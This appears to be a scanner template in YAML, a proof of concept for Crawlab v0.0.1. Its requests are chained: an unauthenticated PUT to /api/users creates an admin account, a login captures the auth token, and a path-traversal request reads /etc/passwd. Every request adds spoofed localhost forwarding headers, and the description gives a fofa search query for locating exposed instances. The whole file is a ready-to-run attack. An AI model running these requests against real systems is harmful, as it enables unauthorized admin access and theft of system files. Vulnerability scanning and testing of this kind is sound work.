expression: r0() && r1() && r2()
id: crawlab-any-adduser-and-anyfile-read
info:
  author: daffainfo
  description: "Crawlab users \u7684 api \u5B58\u5728\u4EFB\u610F\u7528\u6237\u6DFB\
    \u52A0\uFF0C\u4E14\u6DFB\u52A0\u4E3A\u672A\u6388\u6743\u63A5\u53E3\uFF0C\u53EF\
    \u901A\u8FC7\u6DFB\u52A0\u540E\u5728\u540E\u53F0\u8FDB\u4E00\u6B65\u653B\u51FB\
    \u3002\u6F0F\u6D1E\u5F71\u54CD:Crawlab v0.0.1\nfofa-query: title=\"Crawlab\"\n"
  name: "Crawlab users \u4EFB\u610F\u7528\u6237\u6DFB\u52A0\u6F0F\u6D1E \u4EFB\u610F\
    \u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E"
  reference:
  - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Crawlab%20users%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E.md
  severity: critical
  verified: true
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'"status":') &&
      response.body.bcontains(b'"ok') && response.body.bcontains(b'"message":') &&
      response.body.bcontains(b'"success"')
    request:
      body: '{"username":"{{r1}}","password":"{{r1}}","role":"admin","email":"{{r1}}@qq.com"}

        '
      headers:
        Accept: application/json, text/plain, */*
        x-forwarded-for: 127.0.0.1
        x-originating-ip: 127.0.0.1
        x-remote-addr: 127.0.0.1
        x-remote-ip: 127.0.0.1
      method: PUT
      path: /api/users
  r1:
    expression: response.status == 200 && response.body.bcontains(b'"status":') &&
      response.body.bcontains(b'"ok') && response.body.bcontains(b'"message":') &&
      response.body.bcontains(b'"success"')
    output:
      authdata: search["authdata"]
      search: '"\"data\":\"(?P<authdata>.+?)\",".bsubmatch(response.body)'
    request:
      body: '{"username":"{{r1}}","password":"{{r1}}"}

        '
      headers:
        Accept: application/json, text/plain, */*
        Content-Type: application/json;charset=UTF-8
        x-forwarded-for: 127.0.0.1
        x-originating-ip: 127.0.0.1
        x-remote-addr: 127.0.0.1
        x-remote-ip: 127.0.0.1
      method: POST
      path: /api/login
  r2:
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    request:
      headers:
        Accept: application/json, text/plain, */*
        Authorization: '{{authdata}}'
        x-forwarded-for: 127.0.0.1
        x-originating-ip: 127.0.0.1
        x-remote-addr: 127.0.0.1
        x-remote-ip: 127.0.0.1
      method: GET
      path: /api/file?path=../../etc/passwd
set:
  r1: randomLowercase(20)
